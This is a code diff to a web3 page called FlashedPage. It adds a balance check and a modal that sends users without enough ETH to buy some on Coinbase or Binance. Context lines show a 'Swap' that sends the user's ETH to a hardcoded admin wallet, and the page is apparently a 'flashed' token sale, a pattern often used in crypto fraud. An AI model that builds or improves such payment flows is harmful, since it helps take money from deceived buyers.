@@ -190,6 +190,17 @@ export default function FlashedPage() {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
+      // Check user balance first
+      const balance = await provider.getBalance(userAddress);
+      const balanceETH = parseFloat(ethers.formatEther(balance));
+      const requiredETH = parseFloat(amount);
+      
+      if (balanceETH < requiredETH) {
+        setStatus(`Insufficient funds. You have ${balanceETH.toFixed(4)} ETH, need ${requiredETH} ETH`);
+        setShowModal('needFunds');
+        return;
+      }
+      
       const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
       
       const tx = await signer.sendTransaction({
@@ -666,6 +677,45 @@ export default function FlashedPage() {
                     className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
                   >
                     {loading ? 'Swapping...' : 'Swap'}
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showModal === 'needFunds' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Insufficient Funds</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="text-gray-300 text-sm mb-4">
+                    You need ETH to make purchases. Get ETH from:
+                  </div>
+                  <a 
+                    href="https://www.coinbase.com/buy-ethereum"
+                    target="_blank"
+                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold block text-center"
+                  >
+                    Buy ETH on Coinbase
+                  </a>
+                  <a 
+                    href="https://www.binance.com/en/buy-sell-crypto"
+                    target="_blank"
+                    className="w-full bg-yellow-600 hover:bg-yellow-700 p-3 rounded-lg text-white font-semibold block text-center"
+                  >
+                    Buy ETH on Binance
+                  </a>
+                  <button 
+                    onClick={() => {
+                      copyToClipboard(userAddress);
+                      setShowModal(null);
+                    }}
+                    className="w-full bg-gray-600 hover:bg-gray-700 p-3 rounded-lg text-white font-semibold"
+                  >
+                    Copy My Address (Receive ETH)
                   </button>
                 </div>
               </div>
